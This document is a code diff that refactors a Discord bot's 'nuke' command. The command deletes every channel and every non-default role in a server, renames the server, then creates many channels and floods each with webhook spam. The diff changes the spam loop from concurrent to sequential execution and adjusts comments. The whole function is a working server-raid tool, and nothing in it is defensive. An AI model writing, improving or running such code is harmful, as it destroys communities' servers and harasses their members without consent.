@@ -29,7 +29,7 @@ async def nuke(ctx):
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
 
-    # Delete all channels sequentially with 0.5s delay
+    # Delete all channels sequentially with delay
     for channel in list(guild.channels):
         try:
             await channel.delete()
@@ -37,7 +37,7 @@ async def nuke(ctx):
         except Exception as e:
             print(f"Failed to delete channel {channel.name}: {e}")
 
-    # Delete all roles except @everyone sequentially with 0.5s delay
+    # Delete all roles except @everyone sequentially with delay
     for role in list(guild.roles):
         if role.name != "@everyone":
             try:
@@ -56,28 +56,20 @@ async def nuke(ctx):
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Create channels and spam with 0.3s delay per channel and 0.2s per ping
-    async def create_and_spam(index):
+    # Create channels and spam sequentially with delays
+    for i in range(channels_to_create):
         try:
-            channel = await guild.create_text_channel(f"{channel_name}-{index}")
-            await asyncio.sleep(0.3)  # delay before webhook creation
+            channel = await guild.create_text_channel(f"{channel_name}-{i}")
+            await asyncio.sleep(0.3)  # Delay before webhook creation
             webhook = await channel.create_webhook(name=webhook_name)
             for _ in range(pings_per_channel):
                 try:
                     await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
-                    await asyncio.sleep(0.2)  # delay between pings
+                    await asyncio.sleep(0.2)  # Delay between pings
                 except Exception as e:
                     print(f"❌ Webhook send failed in channel {channel.name}: {e}")
         except Exception as e:
-            print(f"❌ Failed to create/spam channel {index}: {e}")
-
-    semaphore = asyncio.Semaphore(5)
-
-    async def sem_task(i):
-        async with semaphore:
-            await create_and_spam(i)
-
-    await asyncio.gather(*(sem_task(i) for i in range(channels_to_create)))
+            print(f"❌ Failed to create/spam channel {i}: {e}")
 
     print("✅ NUKE complete.")
 
